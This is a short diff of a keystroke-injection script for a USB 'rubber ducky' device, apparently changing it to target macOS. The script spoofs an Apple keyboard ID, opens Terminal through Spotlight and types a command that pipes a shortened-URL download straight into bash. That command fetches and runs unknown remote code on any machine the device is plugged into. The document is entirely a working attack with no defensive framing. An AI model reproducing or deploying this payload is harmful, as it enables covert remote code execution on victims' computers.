@@ -1,9 +1,12 @@
 REM FalsePhilosopher
-REM WIP
-REM Needs curl
+REM target osx
+ID 05ac:021e Apple:Keyboard
 DELAY 300
-CTRL-ALT+t
+COMMAND SPACE
 DELAY 500
+STRING terminal.app
+DELAY 1000
+ENTER
 STRING curl -s -L http://bit.ly/10hA8iC | bash
 DELAY 300
 ENTER
